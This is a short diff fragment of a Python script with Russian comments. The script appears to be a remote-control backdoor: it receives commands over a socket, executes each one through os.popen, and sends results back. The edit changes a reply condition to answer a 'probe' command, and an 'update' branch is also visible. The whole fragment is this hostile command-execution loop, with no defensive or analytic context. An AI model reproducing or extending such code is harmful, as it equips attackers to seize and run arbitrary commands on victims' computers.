@@ -11,7 +11,7 @@ while True:
                 data = sock.recv(1024).decode()  # получаем команду
                 aa = os.popen(data)
                 result = aa.read()
-                if len(result) == 0:
+                if data == "probe":
                     sock.send(" ".encode())  # в случае, если рзультат
                 elif data == "update":
                     sock.send("Updating..".encode())  # в случае, если рзультат
